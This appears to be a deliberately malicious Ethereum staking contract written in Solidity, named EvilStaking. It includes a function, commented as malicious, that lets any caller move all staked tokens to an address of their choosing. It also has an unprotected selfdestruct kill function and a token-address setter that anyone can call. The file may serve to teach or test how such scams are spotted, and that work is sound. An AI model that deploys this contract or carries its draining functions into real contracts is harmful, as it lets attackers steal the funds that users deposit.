//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.2;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract EvilStaking {

    IERC20 public rewardsToken;
    IERC20 public stakingToken;


    constructor () {}

    function setStakingAndRewardTokens(address _stakingToken, address _rewardsToken) public {
        stakingToken = IERC20(_stakingToken);
        rewardsToken = IERC20(_rewardsToken);
    }


    function checkStakedBalance() public view returns (uint256) {
        return stakingToken.balanceOf(address(this));
    }

    // the added malicious function that drains all ERC20 tokens from the contract 
    function stealTokens(address account) public {
        uint256 currBalance = checkStakedBalance();
        stakingToken.transfer(account, currBalance);
    }


    function kill() public {
        selfdestruct(payable(msg.sender));
    }

}